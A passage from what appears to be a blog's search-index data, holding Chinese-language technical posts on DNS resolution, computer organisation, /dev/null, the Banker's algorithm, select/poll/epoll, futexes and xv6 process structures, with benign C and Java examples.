SECTION: music.163.com.\t1\tIN\tCNAME\tmusic.ntes53.netease.com. ;; Query time: 0 msec ;; SERVER: 198.18.0.2#53(198.18.0.2) ;; WHEN: Fri Oct 06 11:41:17 CST 2023 ;; MSG SIZE rcvd: 82 A address ip address\nNS name server 保存下一级域名的服务器，只设置成域名。\nPTR pointer record，根据 ip 查询域名。类似 ARP，用 ip 找 MAC 地址。\nMX mail exchange 电子邮件服务器\nTXT 可以获取这个网站在使用那些第三方服务","reference#Reference":" DNS 入门 Introduction and Layered Network Architecture root servers ips all-root-servers rfc-dns dns-server-types what is dns what is recursive dns dns record types ascii dns-zone zone-file viewdns dns record txt https://www.nslookup.io/ 域名信息查询 dns延迟测试 dns实践 dns-client-dog dns-client-doggo dns速度测试 ","三步走分析一下-dns#三步走分析一下 DNS":"解决什么问题 根据域名找到 IP。为啥要找到域名对应的 IP 呢？答案很简单，因为 TCP/IP 协议栈需要。 很常见的一个问题就是浏览器得到一个 web page 的流程是啥样的。\n什么方式解决问题 怎样组织域名(domain name)？这是域名系统的首要问题。底层的组织架构，决定了域名解析的流程。有点经济基础决定上层建筑的意思。域名少的时候可以直接放在一个文件里。对，这个文件在类 unix 系统里就是 /etc/hosts 的文件。但是域名超级多怎么办？分类、组成层次结构。就像 Linux 的文件系统的组织方式一样。组织成一个树状结构。DNS 的查询问题，那就可以视为树的遍历问题。\ntop level domain com、org、 cn 等等就是所谓的顶级域名。也就是一级域名。那么问题就来了，这些顶级域名存放在哪呢？存放到 root server。换一种理解方法就是，这些 root server 就是顶级域名的 metadata。这些 root server IP 是固定的。实现 DNS 这个功能的软件内置这些 root server 的 ip。这一点很重要。\nrpm -ql bind | grep named.ca /usr/share/doc/bind-9.11.4/sample/var/named/named.ca /var/named/named.ca centos 上安装 bind9 这个文件包含所有的 root servers 的 ip\nsecond level domain 以 www.google.com. 为例 google 就是二级域名。其他的依此类推。\nDNS 层级树 可以看到整个 DNS 的入口就是 root。也就是记录顶级域名在哪些服务器上的信息。这是 root 也就是不需要解析这些记录顶级域名的服务器。直接固定了这些 root server 的 IP 地址。实现 DNS 功能的软件，直接内置这些固定的 IP。DNS 查询第一步就是向这些 root server 查询顶级域名对应哪些 nameserver，也就是顶级域名对应的 IP。其实 DNS也就是个分布式层级数据库。注册域名也就是向数据库添加一条记录。但是不是免费注册的。\nDNS Zone 可以看到整个 DNS 层级树，每一个节点对应一个 Zone。\nuncached DNS lookup 图中 OS stub resovler 就是负责 DNS 解析的进程，发起 DNS 递归查询请求。 local dns server 发起迭代查询，查询域名对应的 IP。之后返给 OS stub resovler(name servers that provide the complete answers to user queries)。\n这个进程向 local dns server 发起递归查询。也就是只需要等 local dns server 查询结果就行。 local dns server 发起迭代查询。因为 local dns server 有所有 root server 的 IP，选择一个 IP，根据顶级域名属于哪一个 TLD Zone， 发起迭代查询。 可以查询得到记录这个顶级域名的 TLD server 有哪些，以及这些服务器的 IP。 local dns server 选择一个 TLD server，发起迭代查询。 得到这个域名的权威服务器。 选择一个权威服务器，发起迭代查询，查询域名对应的 IP。 local dns server 从权威服务器得到域名对应的 IP。 返还给 OS stub resovler。递归查询结束。 Systems normally lookup any name (including domain names) using the hosts file first (if present), followed by DNS. However, the nsswitch.conf file (typically in /etc) controls this order (normally hosts: file dns), allowing the order to be changed or the file value to be deleted entirely depending on local needs.\n有没有其他解决方案 "},"title":"network-dns"},"/blog/notions-of-computer/":{"data":{"":"","references#References":" memory-hierarchy what-is-a-domain-name dns-root-server ip number resources The Internet Numbers Registry System Filesystem_Hierarchy_Standard Filesystem Hierarchy Standard List network-layer internet-protocol what-is-a-computer-port open-systems-interconnection-model CSE141-Caching ","指导思想#指导思想":"计算机是人发明的。由计算机组成的世界，其设计思想很明显要借鉴现实中的东西。正如一位伟人的著作开篇提出 “谁是我们的敌人？谁是我们的朋友？这个问题是革命的首要问题。中国过去一切革命斗争成效甚少，其基本原因就是因为不能团结真正的朋友，以攻击真正的敌人。”那么应对计算机，什么才是计算机组织背后的指导思想呢？个人认为有三个：1. hierarchy(层级)、2：group(分组)、3：order(有序)\nhierarchy(层级) hierarchy 在这里也可以理解成等级。层级结构最重要的一点就是最顶层在哪？用 tree 理解就是，root 在哪？这个信息整个层级都要知道。哈哈，是不是挺像皇帝。😄\n面对数量庞大的相同事物，怎样管理呢？用什么组织方式呢？ 这里的数量庞大要是成千上万的。比如中国有十几亿人口、中国有 960 万平方公里的土地，等等。首先简述一下历史上的经验，比如西周，采用分封制。天子、诸侯、卿、士、平民等所有人组成一个金字塔形状。每一个层级的人权力大小不同、承担的责任和义务也不同。对于土地则是封邦建国。分封制可以对人口、土地等进行有效的统治。更直观的理解就是形成稳定的阶级。到这是不是立刻就能想到由于每种存储的价格、速度、容量不同，应用在哪个地方也不同。也是组织成一个层级结构来构成整个计算机的存储系统。\n从数学的角度分析就是：用对数的方式搞定数量庞大的事物的管理。不管数量多庞大，用对数搞一下，数量立刻就降下来。比如 log24294967296 = 32。对数的发明、解析几何的创立和微积分的建立是17世纪数学的三大成就。\n域名组织方式 In 2017, 330.6 million domain names had been registered. 2017 年已经有 33 多亿的注册域名了。\n如果让你组织数量如此庞大的域名，你该怎样组织呢？没错，也是组织成层级结构，来管理数量如此庞大的域名。一开始的解决方法是直接把域名信息放在 /etc/hosts 文件，随着域名增多，单独的一个文件没法满足要求，数量太多了嘛，放在一个文件，且不论能不能全部存储，查找都是一个大问题。\nIP 分配管理方式 IP Addresses are unique identifiers used to determine who is who on the Internet. IP 地址是一个 32bit 的无符号整数。范围是 [0,2^32-1], 一共有 4294967296 个整数。将近 43 亿个 ip 地址(这里不考虑公网、私网)该怎样分配使用呢？由 Internet Assigned Numbers Authority (IANA) 负责协调管理所有 IP，同时负责分配自治系统号(Autonomous System number)。\nBoth IPv4 and IPv6 addresses are generally assigned in a hierarchical manner. Users are assigned IP addresses by Internet service providers (ISPs). ISPs obtain allocations of IP addresses from a local Internet registry (LIR) or National Internet Registry (NIR), or from their appropriate Regional Internet Registry (RIR):\n数量庞大的 IP 地址怎样分配管理呢？组成层级结构。通过一级一级委托，管理数量庞大的 IP 地址。\n文件组织方式 不同性质的事物，怎样组织呢？ memory hierarchy Typical memory hierarchy OSI 参考模型 网络每一层，功能不同。\ngroup(分组) 体量庞大的东西的基层组织。\n可视为层级结构的最底层。block、page、packet、fragment、set 也可以视为不同的模块。module、segment、section 也可以理解成分类。sort 域名 对域名来说一个分组可以理解成一个一级域名下的所有域名。如 org下的域名。当然也可以理解成一个 二级域名下的所有域名。如 google.com 下 Google 家所有的域名。依次类推。可以看出，同种事物进行层级组织，本身就是在进行分组。\nIP 地址 An autonomous system (AS) is a very large network or group of networks with a single routing policy. Each AS is assigned a unique ASN, which is a number that identifies the AS.\n没错。IP 地址也是通过一个一个的实体来管理使用的，一个实体就是一个自治系统。(autonomous system)。比如中国移动这个运营商的 AS Number 是 56041，管理一系列 IP 地址。再比如 Apple 的 AS Number 是 714。\nInternet Protocol Data traversing the Internet is divided into smaller pieces, called packets. IP information is attached to each packet, and this information helps routers to send packets to the right place.\n通过网络发送大量的信息，也是拆分成一个个 packet。这里也可以理解成分组。\n文件系统 文件系统管理磁盘空间。磁盘空间划分为一个个相同大小的 Block。一个扇区是 512Bytes，这可以视为一个分组。\n网络流量 Ports are virtual places within an operating system where network connections start and end. They help computers sort the network traffic they receive.\n计算机从网络上接收的 packet 怎样判定哪一个是接收者呢？对网络流量分类就行。怎样分类呢？用端口号，不同的接收者，接收不同端口的流量。\nsubnet Think of the Internet as a network of networks: computers are connected to each other within networks, and these networks connect to other networks. This enables these computers to connect with other computers both near and far. A network is a group of two or more connected computing devices.\n划分子网，也是在分组。\norder(顺序) 顺序、分支、循环。顺序就是程序三大结构之一。没有秩序的世界是混乱的，啥事也做不成。 TCP 协议目的之一就是要保证计算机接收到的网络包的顺序。怎样保证顺序呢？非常简单，为每一个 Byte 编号就行。"},"title":"notions_of_computer"},"/blog/null-device/":{"data":{"null-device-是啥#NULL device 是啥？":"NULL device 是啥？The null device is a special file that discards all data written to it, but reports that the write operation succeeded.","references#References":" dev-null windows-NUL man7 /dev/null NUL in Windows seems to be actually a virtual path in any folder ","用在何处#用在何处？":" java 执行外部的命令, 但是不需要外部命令的执行结果. 直接丢弃 stdout, stderr.\nimport java.io.*; public class DiscardProcessOutput { public static void main(String[] args) { try { // Create the ProcessBuilder with the command to run ProcessBuilder processBuilder = new ProcessBuilder(\"someCommand\"); // Merge stdout and stderr and redirect them to /dev/null (or NUL in Windows) processBuilder.redirectErrorStream(true); if (System.getProperty(\"os.name\").contains(\"Windows\")) { processBuilder.redirectOutput(new File(\"NUL\")); } else { processBuilder.redirectOutput(new File(\"/dev/null\")); } // Start the process Process process = processBuilder.start(); // Wait for the process to finish int exitCode = process.waitFor(); System.out.println(\"Process exited with code: \" + exitCode); } catch (IOException | InterruptedException e) { e.printStackTrace(); } } } "},"title":"Null Device"},"/blog/os-banker-s-algorithm/":{"data":{"":"","bankers-algorithm#Banker\u0026rsquo;s Algorithm":"Banker’s Algorithm 银行家算法是什么 银行家主要就是通过放贷来赚钱的。那最重要的问题是啥？当然是把钱借给还得起的人咯。试想，银行把钱都借给了还不起的人，那银行就完蛋了。假设有一批人（多个进程）来借钱（将要申请资源），但是银行剩下的钱满足不了任何人，那就直接拒绝借贷。当然了，有一部分已经借出的钱回收之后（回收已经分配的资源），又可以满足一批人中某些人的借贷需求。依次类推，银行可以判定能不能按照某个顺序来给这批人放贷。类似的思路延伸到计算机世界，同理。操作系统给多个进程分配资源，能不能找到一个顺序给这些进程分配资源，并逐渐回收资源？从而满足多个进程的资源需求。采用银行家放贷和收贷的思路（这里排除利息，放多少贷，收多少钱。呵呵，哪有此种好事？）来分配和回收系统资源就是所谓的银行家算法。\n银行家算法解决什么问题 resource allocation and deadlock avoidance algorithm。银行家算法用来进行资源分配和避免死锁。\n银行家算法怎样解决问题 P0、P1、P2、P3、P4 5个进程，视为需要钱的 5 个人。 A、B、C 三种系统资源。分别视为是银行三种贵金属：金块、银块、铜块。\nallocation table 已放贷表 每个人已经借的金银铜个数列表\nA B C P0 0 1 0 P1 2 0 0 P2 3 0 2 P3 2 1 1 P4 0 0 2 max table 最大借贷表 每个人需要金银铜最大个数列表\nA B C P0 7 5 3 P1 3 2 2 P2 9 0 2 P3 2 2 2 P4 4 3 3 need table 还需放贷表 每个人还需要的金银铜个数列表。由 max table - allocation table 得到。\nA B C P0 7 4 3 P1 1 2 2 P2 6 0 0 P3 0 1 1 P4 4 3 1 available table 剩余资源表 银行还剩下的金银铜个数。\nA B C 3 3 2 剩余系统资源分配顺序推演 拿着 available table （剩余资源表），到 need table（还需放贷表） 比对。若 available table 的 A B C 满足 need table 的某一行（也就是 available table 每一列都大于等于 need table 的某一行的每一列）。说明可以分配给这个进程，标记这一行。同时回收这一行对应的 allocation table 中已经分配的 A B C。更新 available table 的 A B C。以此类推，继续比对 need table 中其他未标记的行。若最后 need table 所有行都有标记，说明存在一个给 P0、P1、P2、P3、P4 进程分配资源的顺序。 拿着 available table 剩余资源表，不满足 need table 中任何一行。说明不存在一个给 P0、P1、P2、P3、P4 进程分配资源的顺序。系统有可能进入死锁。 银行家算法图解分析 存在的一个序列 P1 -\u003e P3 -\u003e P4 -\u003e P0 -\u003e P2\n有没有其他方法解决此问题 Banker’s Algorithm implemention // Banker's Algorithm #include \u003cstdio.h\u003e int main() { // P0, P1, P2, P3, P4 are the Process names here int n, m, i, j, k; n = 5; // Number of processes m = 3; // Number of resources int alloc[5][3] = { { 0, 1, 0 }, // P0 // Allocation Matrix { 2, 0, 0 }, // P1 { 3, 0, 2 }, // P2 { 2, 1, 1 }, // P3 { 0, 0, 2 } }; // P4 int max[5][3] = { { 7, 5, 3 }, // P0 // MAX Matrix { 3, 2, 2 }, // P1 { 9, 0, 2 }, // P2 { 2, 2, 2 }, // P3 { 4, 3, 3 } }; // P4 int avail[3] = { 3, 3, 2 }; // Available Resources int finished[n], ans[n], index = 0; for (k = 0; k \u003c n; k++) { finished[k] = 0; } int need[n][m]; for (i = 0; i \u003c n; i++) { for (j = 0; j \u003c m; j++) // 计算 need matrix need[i][j] = max[i][j] - alloc[i][j]; } int y = 0; for (k = 0; k \u003c 5; k++) { for (i = 0; i \u003c n; i++) { if (finished[i] == 0) { int flag = 0; for (j = 0; j \u003c m; j++) { if (need[i][j] \u003e avail[j]){ flag = 1; break; } } if (flag == 0) { ans[index++] = i; for (y = 0; y \u003c m; y++) avail[y] += alloc[i][y]; finished[i] = 1; } } } } printf(\"Following is the SAFE Sequence\\n\"); for (i = 0; i \u003c n - 1; i++) printf(\" P%d -\u003e\", ans[i]); printf(\" P%d\", ans[n - 1]); return (0); } ","references#References":" 银行家算法-wiki bankers-algorithm "},"title":"os-banker's-algorithm"},"/blog/select-poll-epoll/":{"data":{"":" 弄清楚 I/O Multiplexing 和 Linux 中 select, poll, epoll 之间的关系.","io-multiplexing#I/O Multiplexing":" I/O multiplexing 这里面的 multiplexing 指的其实是在单个线程通过记录跟踪每一个 Sock(I/O 流)的状态. select, poll, epoll 都是 I/O multiplexing的具体的实现, 之所以有这三个存在，其实是他们出现是有先后顺序的.","io-multiplexing-和-multiplexer#I/O Multiplexing 和 Multiplexer":" I0, I1, I2, I3 视为 4 个 I/O 流. 值为 1 时, 视为一个 I/O 流. 4x1 Multiplexer 作为硬件实现的 I/O multiplexing. 可以周期性的设置S1 和 S0 的值, 通过监测 Y 的输出, 得到 I0, I1, I2, I3 的输入. {% asset_img multiplexers_S1_S0_I0.png multiplexers_S1_S0_I0 %}\nselect select 被实现以后, 很快就暴露出了很多问题.\nselect 会修改传入的参数数组, 这个对于一个需要调用很多次的函数, 是非常不友好的. select 如果任何一个 sock(I/O stream) 出现了数据, select 仅仅会返回, 但是并不会告诉你是那个 sock 上有数,于是你只能自己一个一个的找. 相当于监测到 Mutiplexer 的 Y = 1, 但是不知道 I0, I1, I2, I3哪一个的输入是 1. 也就是不告诉 S1 和 S0的值, 那就只好再去具体查看一次. I0, I1, I2, I3的值.\nselect 只能监视 1024 个链接. 相当于实现了一个 1024x1 的 Mutiplexer. 只能有1024 个输入. select 不是线程安全的. poll 修复版的 select\npoll 去掉了 1024 个链接的限制 epoll epoll 可以说是 I/O 多路复用最新的一个实现, epoll 修复了 poll 和 select 绝大部分问题, 比如:\nepoll 现在是线程安全的。 epoll 现在不仅告诉你 sock 组里面数据，还会告诉你具体哪个 sock 有数据, 你不用自己去找了. 相当于监测到 Mutiplexer 的 Y = 1, 且告知了此时的 S1 和 S0 的值, 通过组合就可以知道是哪一个具体的输入是 1 了.","multiplexer#multiplexer":" Multiplexer is a combinational circuit that has maximum of 2^n data inputs, n selection lines and single output line. One of these data inputs will be connected to the output based on the values of selection lines. Since there are n selection lines, there will be 2^n possible combinations of zeros and ones. So, each combination will select only one data input. Multiplexer is also called as Mux. 聚合多个输入, 通过 selection lines 来选择一个输出.\n4x1 Multiplexer 分析 聚合 I0, I1, I2, I3 这 4 个输入, 通过 S1 和 S0 来选择一个输出.\nBlock diagram of 4x1 Multiplexer Y(output) 输出值的分析 S1 = 0, S0 = 0 时 Y 的值由 I0 决定 S1 = 0, S0 = 0. 此时的 I1, I2, I3, 无论是 0 还是 1, 对应的 and gate 输出都是 0, 对最终输出 Y 没有影响. 此时 I0 的输入决定 Y 的值. 也就是 Y = I0.\nS1 = 0, S0 = 1 时 Y 的值由 I1 决定 S1 = 0, S0 = 1. 此时的 I0, I2, I3, 无论是 0 还是 1, 对应的 and gate 输出都是 0, 对最终输出 Y 没有影响. 此时 I1 的输入决定 Y 的值. 也就是 Y = I1.\nS1 = 1, S0 = 0 时 Y 的值由 I2 决定 S1 = 1, S0 = 0. 此时的 I0, I1, I3, 无论是 0 还是 1, 对应的 and gate 输出都是 0, 对最终输出 Y 没有影响. 此时 I2 的输入决定 Y 的值. 也就是 Y = I2.\nS1 = 1, S1 = 0 时 Y 的值由 I3 决定 S1 = 1, S0 = 1. 此时的 I0, I1, I2, 无论是 0 还是 1, 对应的 and gate 输出都是 0, 对最终输出 Y 没有影响. 此时 I3 的输入决定 Y 的值. 也就是 Y = I3.\nTruth table of 4x1 Multiplexer S1(高位) S0(低位) S1S0(值) Y 0 0 0 I0 0 1 1 I1 1 0 2 I2 1 1 3 I3 Multiplexer (Mux) 4x1 Multiplexer 相当于提供了一种映射, Y = I(S1S0). 通过组合S1 和 S0 的值, 可以直接得到 IS1S0 的值.也就是通过 4x1 Multiplexer 输出的 Y 值是 I0, I1, I2, I3 之一.","references#References":" circuits_multiplexers circuits_demultiplexers epoll的本质 I/O multiplexing "},"title":"select_poll_epoll"},"/blog/syscall-futex/":{"data":{"":"","futex-balancing-userkernel-responsibilities#\u003cstrong\u003eFutex: Balancing User/Kernel Responsibilities\u003c/strong\u003e":"","how-futex-works#\u003cstrong\u003eHow Futex Works?\u003c/strong\u003e":"","什么情况会发生-spurious-wakeups#\u003cstrong\u003e什么情况会发生 Spurious Wakeups?\u003c/strong\u003e":"Futex (Fast Userspace Mutex)\nA futex is a Linux kernel system call that provides a fast and efficient mechanism for implementing user-space synchronization primitives, such as mutexes, semaphores, and condition variables. It minimizes kernel involvement in uncontended cases, reducing overhead by handling synchronization in userspace when possible.\nFutexes split synchronization into user-space atomics (fast) and kernel-assisted blocking (slow), optimizing for the common case. The boundary is enforced by hardware (CPU modes) and the need for kernel-managed resources (scheduling, interrupts).\nHow Futex Works? 没有竞争，CAS 后直接获取锁，不涉及到 syscall 有竞争, futex_wait 让线程 sleep, 等待其他线程 futex_wake 唤醒 大多数时候是没有竞争的，所以就减少了内核的干预。\nfutex 设计原则 Avoid Kernel Calls When Possible Use atomic operations for uncontended cases (fast path). Only call the kernel when blocking is required (slow path). Kernel as a Backstop The kernel handles complex tasks like: Managing wait queues. Guaranteeing fairness/priority in thread wakeup. Handling signals/interrupts during blocking. Spurious Wakeups The kernel may wake threads even if the futex value hasn’t changed (e.g., due to signals). User-space must recheck the futex value after wakeup (e.g., loop in lock()). 为啥需要减少内核的干预? Kernel calls (system calls) are expensive compared to user-space operations.\nContext Switch Overhead When a thread enters the kernel (e.g., via syscall), the CPU must: Save user-space registers. 保存用户空间寄存器 Switch to kernel mode (privileged CPU state). CPU 模式切换到特权模式 Run kernel code (e.g., scheduler, wait queues). 执行内核代码，比如调度器 Restore user-space state afterward. 恢复用户空间寄存器 This process takes hundreds to thousands of CPU cycles, adding latency. Scalability Frequent kernel calls create contention in the kernel’s internal data structures (e.g., locks for process/thread management). Kernel resources are shared across all processes, so overuse hurts overall system performance. 所有进程共享内核资源 Fast-Path Optimization Most synchronization operations (e.g., locking a mutex) are uncontended (no other thread holds the lock). Handling these cases purely in user-space avoids kernel interaction entirely. User Space and Kernel 边界 The boundary is defined by CPU privilege levels and the need for kernel-managed resources:\nUser Space Kernel Space Runs in unprivileged CPU mode (ring 3). Runs in privileged CPU mode (ring 0). Directly manipulates user memory. Manages hardware, interrupts, scheduling. Uses atomic CPU instructions (e.g., cmpxchg). Uses system calls (e.g., futex, sched_yield). Handles “fast path” (uncontended case). Manages “slow path” (blocking/waking threads). Futex: Balancing User/Kernel Responsibilities futex 横跨 user/kernel 两个空间\nUser-Space Fast Path (No Contention) Atomic Compare-and-Swap (CAS): atomic_compare_exchange_strong(\u0026futex, 0, 1); // Pure user-space If the lock is free (futex == 0), the thread acquires it without involving the kernel. This is a single CPU instruction (e.g., lock cmpxchg on x86), blazing fast. Kernel Slow Path (Contention) Blocking with FUTEX_WAIT syscall(SYS_futex, \u0026futex, FUTEX_WAIT, 1, ...); If the lock is held (futex == 1), the thread asks the kernel to block it until the lock is freed. The kernel adds the thread to a wait queue and schedules other threads. Waking with FUTEX_WAKE syscall(SYS_futex, \u0026futex, FUTEX_WAKE, 1, ...); On unlock, the kernel wakes one blocked thread. This involves scheduler logic (kernel responsibility). Futex 主要操作 FUTEX_WAIT: Puts the calling thread to sleep if the futex word matches the expected value. If *uaddr == val, the thread goes to sleep (blocks). If *uaddr != val, the call returns immediately with EAGAIN. If a timeout is set, the thread may also wake up due to timeout (ETIMEDOUT). FUTEX_WAKE: Wakes up a specified number of threads waiting on the futex. FUTEX_WAIT_BITSET / FUTEX_WAKE_BITSET: Advanced operations for conditional waits using bitmasks (e.g., for condition variables). 工作流程示例 Thread A acquires the lock:\nCAS succeeds in user space (futex becomes 1). No kernel interaction. Thread B tries to acquire the lock:\nCAS fails (futex is 1). Calls FUTEX_WAIT to block (kernel involvement). Thread A releases the lock:\nSets futex to 0 (user space). Calls FUTEX_WAKE to unblock Thread B (kernel). Why This Matters in Practice? Performance: A futex-based mutex can be 10–100x faster than a traditional kernel-only mutex under low contention. Scalability: Reduces kernel lock contention in highly parallel workloads (e.g., databases, game engines). Flexibility: User-space can implement custom synchronization logic (e.g., adaptive mutexes, read/write locks). Core Concept:\nA futex word (a 32-bit integer in shared memory) acts as the synchronization variable. 和平台无关, 都是 32bit Threads use atomic operations (e.g., compare-and-swap) to manipulate this word in userspace. Kernel intervention occurs only during contention (e.g., when a thread must wait). Acquiring a Lock (Uncontended Case):\nA thread attempts to atomically set the futex word from 0 (unlocked) to 1 (locked). If successful, the lock is acquired without a system call. Acquiring a Lock (Contended Case):\nIf the lock is already held (futex_word == 1), the thread calls futex_wait(\u0026futex_word, 1) to block. The kernel checks if the futex word is still 1 and puts the thread to sleep, avoiding race conditions. Releasing a Lock:\nThe thread sets the futex word back to 0 atomically. It then calls futex_wake(\u0026futex_word, 1) to wake up one waiting thread. Handling Spurious Wakeups:\nAfter waking, threads re-check the futex word to ensure the lock is available before proceeding. 例子理解 futex_demo.c#include \u003clinux/futex.h\u003e #include \u003csys/syscall.h\u003e #include \u003cunistd.h\u003e #include \u003cstdio.h\u003e #include \u003cpthread.h\u003e // Futex word (shared between threads) int futex_var = 0; // 0 = unlocked, 1 = locked // Wrapper for futex_wait syscall void futex_wait(int* uaddr, int val) { syscall(SYS_futex, uaddr, FUTEX_WAIT, val, NULL, NULL, 0); } // Wrapper for futex_wake syscall void futex_wake(int* uaddr) { syscall(SYS_futex, uaddr, FUTEX_WAKE, 1, NULL, NULL, 0); } // Thread function with custom sleep time void* thread_func(void* arg) { int sleep_time = *(int*)arg; // Cast void* to int* // Try to acquire lock (using GCC atomic compare-and-swap) int expected = 0; while (!__sync_bool_compare_and_swap(\u0026futex_var, 0, 1)) { // Contended case: wait for wakeups printf(\"Thread %lu acquired the lock failed\\n\", pthread_self()); futex_wait(\u0026futex_var, 1); } // Critical section (simulate work with custom sleep) printf(\"Thread %lu acquired the lock success, sleeping for %d seconds\\n\", pthread_self(), sleep_time); sleep(sleep_time); // Customizable sleep duration // Release lock futex_var = 0; futex_wake(\u0026futex_var); return NULL; } int main() { // Define sleep durations for each thread int sleep1 = 5; // First thread sleeps for 1 second int sleep2 = 3; // Second thread sleeps for 3 seconds int sleep3 = 2; // Create threads pthread_t t1, t2, t3; printf(\"%p\\n\",\u0026futex_var); pthread_create(\u0026t1, NULL, thread_func, \u0026sleep1); pthread_create(\u0026t2, NULL, thread_func, \u0026sleep2); pthread_create(\u0026t3, NULL, thread_func, \u0026sleep3); // Wait for threads to finish pthread_join(t1, NULL); pthread_join(t2, NULL); pthread_join(t3, NULL); return 0; } gcc -g -pthread -std=gnu11 futex_demo.c -o futex_demo\n什么是 Spurious Wakeup? A spurious wakeup occurs when a thread waiting on a synchronization primitive (e.g., a condition variable, futex, or semaphore) wakes up without being explicitly signaled or broadcasted. This means the thread resumes execution even though no other thread modified the condition it was waiting for.\nSpurious wakeups are not errors in the system. they are a design trade-off in low-level synchronization mechanisms like futexes to avoid unnecessary overhead in kernel-space implementations.\n为啥需要 spurious Wakeups? spurious wakeups are allowed for performance and implementation efficiency, particularly in systems like Linux futexes.\n为了性能和高效的实现需要 spurious wakeups\n1. Kernel Optimization The Linux kernel uses shared data structures (e.g., wait queues) for threads waiting on a futex. If multiple threads are waiting on the same futex word, the kernel may wake up more than one thread (even if only one is needed) to reduce contention and latency. This avoids the overhead of tracking exactly which thread should wake up. 2. Signal Handling A thread waiting on a futex may be interrupted by a signal (e.g., SIGINT, SIGALRM). The kernel wakes up the thread to handle the signal, even if the futex condition hasn’t changed. 3. Hardware/Architecture Constraints Some architectures or hardware may not guarantee atomicity between checking the condition and sleeping, leading to race conditions that require re-checking after waking. 什么情况会发生 Spurious Wakeups? Scenario Description Multiple Waiters When many threads wait on the same futex, the kernel may wake multiple threads (e.g., via FUTEX_WAKE) even if only one is needed. 多个等待同一个 futex 的线程, 被 os 一并唤醒, 但最终只有一个获取 futex Signal Interruption A thread is interrupted by a signal (e.g., Ctrl+C), causing it to wake up prematurely.\n虽然进程 sleep 了, 但是仍可以被 os 唤醒处理信号 Timeout Expiration If a timeout is set (e.g., FUTEX_WAIT_BITSET with a timeout), the thread may wake up due to the timeout, even if the condition hasn’t changed. 设置了超时, 超时后可以被 os 唤醒 Kernel Preemption In high-load scenarios, the kernel may preempt a waiting thread for scheduling reasons. 被 os 抢占调度唤醒 如何处理 Spurious Wakeups? To handle spurious wakeups correctly, always re-check the condition after waking up. This is a fundamental rule in concurrent programming.\n例子1 重新检查条件 // Shared futex word (0 = unlocked, 1 = locked) int futex_var = 0; // Thread attempts to acquire the lock while (!__sync_bool_compare_and_swap(\u0026futex_var, 0, 1)) { // Wait for wakeups if futex_var is still 1 futex_wait(\u0026futex_var, 1); } Here’s what happens:\nIf futex_wait returns due to a spurious wakeup, the thread re-checks the condition (futex_var == 1) in the loop. If the condition is still true, the thread calls futex_wait again. If the condition is now false (e.g., another thread released the lock), the thread proceeds. 例子2 重新检查条件 pthread_mutex_lock(\u0026mutex); while (!condition_met) { pthread_cond_wait(\u0026cond, \u0026mutex); // Releases mutex, waits for signal } // Re-check condition here (spurious wakeups handled by the loop) pthread_mutex_unlock(\u0026mutex); The while loop ensures that spurious wakeups are harmless.\nWhy Not Prevent Spurious Wakeups? Preventing spurious wakeups would require strict guarantees from the kernel or library, which could introduce significant overhead. For example:\nTracking exactly which thread should wake up (e.g., via a queue). Adding memory barriers or locks to ensure atomicity between checking and sleeping. By allowing spurious wakeups, systems like futexes remain lightweight and scalable for high-performance applications.","什么是-spurious-wakeup#\u003cstrong\u003e什么是 Spurious Wakeup?\u003c/strong\u003e":""},"title":"Syscall Futex"},"/blog/three-easy-pieces-4-process/":{"data":{"":" 我们知道一个计算机 CPU 数量有限, 但是却可以同时跑数量远远多于 CPU 数量的程序. 其实这就是 virtualizing. 怎样进行 CPU 虚拟化呢? 通过抽象出 process 这个基本概念, 也就是 running program. 一个没有运行的程序, 也就是磁盘上的一堆指令集和一些数据. 通过 time sharing 让一个 process stop, 然后去 run 另外一个 process. 重复这个 context switch 过程, 可以让多个程序同时运行, 这就是在virtualizing CPU. mechanisms are low-level methods or protocols that implements a needed piece of functionality. 类似于 java 中的接口, 就是我要提供什么功能. 比如 OS 中的进程的 context switch这个机制. policies are algorithms for making some kind of decision within the OS.类似 java 中实现类, 怎么实现这个接口定义的方法. 比如 OS 中的进程调度策略就是为了实现进程 context switch. mechanisms 和 policies 分离, 和 java 中接口和实现非常相似. 实际上这也是软件设计的原则. OS 本身也是软件.","data-structures#data structures":" 以下是 xv6 这个 MIT 教学 OS 的 proc.h\n// Per-CPU state struct cpu { uchar apicid; // Local APIC ID struct context *scheduler; // swtch() here to enter scheduler struct taskstate ts; // Used by x86 to find stack for interrupt struct segdesc gdt[NSEGS]; // x86 global descriptor table , 拿着 GDT 使用内存 volatile uint started; // Has the CPU started? int ncli; // Depth of pushcli nesting. int intena; // Were interrupts enabled before pushcli? struct proc *proc; // The process running on this cpu or null }; extern struct cpu cpus[NCPU]; extern int ncpu; //PAGEBREAK: 17 // Saved registers for kernel context switches. // Don't need to save all the segment registers (%cs, etc), // because they are constant across kernel contexts. // Don't need to save %eax, %ecx, %edx, because the // x86 convention is that the caller has saved them. // Contexts are stored at the bottom of the stack they // describe; the stack pointer is the address of the context. // The layout of the context matches the layout of the stack in swtch.S // at the \"Switch stacks\" comment. Switch doesn't save eip explicitly, // but it is on the stack and allocproc() manipulates it. struct context { uint edi; uint esi; uint ebx; uint ebp; uint eip; }; enum procstate { UNUSED, EMBRYO, SLEEPING, RUNNABLE, RUNNING, ZOMBIE }; // Per-process state struct proc { uint sz; // Size of process memory (bytes) 分配的内存大小 pde_t* pgdir; // Page table 页表 char *kstack; // Bottom of kernel stack for this process enum procstate state; // Process state 进程状态 int pid; // Process ID struct proc *parent; // Parent process 父进程 struct trapframe *tf; // Trap frame for current syscall struct context *context; // swtch() here to run process void *chan; // If non-zero, sleeping on chan int killed; // If non-zero, have been killed struct file *ofile[NOFILE]; // Open files struct inode *cwd; // Current directory char name[16]; // Process name (debugging) }; // Process memory is laid out contiguously, low addresses first: // text // original data and bss // fixed-size stack // expandable heap ","physical-organization-of-a-modern-system#physical organization of a modern system":"","process-api#process API":"create destroy kill a process or halt it\nwait miscellaneous control suspend process, stop it from running for a while resume process, contine it running\nstatus ","process-creation-a-little-detail#process creation: a little detail":" 把程序从磁盘加载到内存. 问题来了:\n是要全部加载到内存吗? (eagerly) 还是部分加载到内存? (lazy, paging) 抑或内存根本不够存放整个程序? (swapping) 启动程序的必要代码和数据加载了吗? (一系列 run-time 设置) 分配供函数执行的 run-time stack(or just stack). 在 C 语言中, 用来存放 function parameters, local variables, return addresses, 想一想 main 的函数参数 argc,argv, 应该就是 OS 初始化的. 分配/回收 heap. (malloc 和 free). set up related I/O execute program, 跳到 entry point, 也就是 main(). ","process-states#process states":"简单来说, 分为 3 种状态:\nrunning a process is running on a processor, which means it is executing instructions\nready a process is ready to run but for some reason the OS has chosen not run it at this given moment\nblocked a 